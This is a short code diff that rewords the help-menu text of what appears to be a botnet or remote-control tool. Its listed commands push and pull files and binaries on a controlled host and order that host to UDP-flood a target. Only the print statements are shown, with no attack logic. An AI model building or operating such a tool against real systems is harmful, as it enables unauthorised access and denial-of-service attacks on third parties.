@@ -418,8 +418,8 @@ def list_connected_commands():
     """Print List of Commands when Host is Selected."""
     print ("List of Commands when Host is Selected")
     print ("$List_Commands -> Display this list")
-    print ("$Make_File local_file_name (remote_file_name)-> Create remote file")
-    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
+    print ("$Make_File local_file_name (remote_file_name)-> Send local file")
+    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Send local binary")
     print ("$Pull_File remote_file_name (local_file_name)-> Get remote file")
     print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
     print ("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
